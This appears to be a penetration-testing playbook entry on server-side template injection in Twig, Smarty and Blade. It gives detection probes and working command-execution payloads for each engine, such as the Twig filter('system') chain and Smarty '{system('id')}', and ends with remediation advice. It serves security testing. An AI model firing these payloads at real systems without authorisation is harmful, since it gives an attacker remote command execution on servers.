# Server-side template injection (Twig/Smarty/Blade)

Symfony (Twig), Smarty, and Laravel Blade all appear in PHP stacks flagged by
10-fingerprint (`symfony`/`laravel_session` cookies). Any value rendered
through the engine as a TEMPLATE (not passed as a variable) — search results,
error/404 pages, email/report templates, user-editable page snippets —
evaluates expressions server-side.

1. **Detect**: submit an engine-specific arithmetic probe and look for the
   EVALUATED result, not the literal: Twig `{{7*'7'}}` → `49` (Smarty errors
   or ignores it); Smarty `{7*7}` → `49`; Blade `{{ 7*7 }}` normally just
   echoes — evaluation here means raw PHP leaked through unescaped `{!! !!}`
   output or a compiled-view injection. Sweep all three in one `http_fuzz` on
   the value, `match_regex:"\\b49\\b"`.
2. **Twig RCE** once `{{7*7}}` fires:
   `{{['id']|filter('system')}}` or
   `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`.
   Read command output from the response body.
3. **Smarty RCE**: `{php}echo shell_exec('id');{/php}` (older Smarty with PHP
   tags enabled) or `{system('id')}` on hardened versions.
4. **Blade**: injection usually needs a stored/admin-editable view or
   `Blade::compileString($input)` — confirm via a stored payload
   (`{{ system('id') }}` inside `{!! !!}`) then revisit the rendering page.

Evidence: the `49` reflection, then `id`/`uname -a` command output.
Remediation: never render user input AS a template (bind it as a variable
instead); disable Smarty `{php}` tags; Twig sandboxed `SandboxExtension`
with a tag/filter allowlist.
